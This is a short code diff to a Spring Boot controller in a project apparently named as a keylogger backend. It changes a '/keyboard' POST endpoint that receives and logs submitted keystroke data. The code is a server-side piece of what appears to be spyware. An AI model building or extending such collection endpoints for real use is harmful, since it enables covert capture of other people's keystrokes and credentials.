@@ -1,6 +1,6 @@
 package keylogger.backend.controllers;
 
-import jakarta.validation.Valid;
+import jakarta.validation.constraints.Null;
 import keylogger.backend.dtos.KeyboardDto;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.http.ResponseEntity;
@@ -14,8 +14,10 @@ import org.springframework.web.bind.annotation.RestController;
 @RequestMapping("/keyboard")
 public class KeyboardController {
     @PostMapping
-    private ResponseEntity<String> keyboard(@Valid @RequestBody KeyboardDto payload) {
-        log.info(payload.logs());
+    public ResponseEntity<Null> handleKeyboardLogs(@RequestBody KeyboardDto keyboardDto) {
+        if (!keyboardDto.logs().isEmpty()) {
+            log.info(keyboardDto.logs());
+        }
         return ResponseEntity.noContent().build();
     }
 }
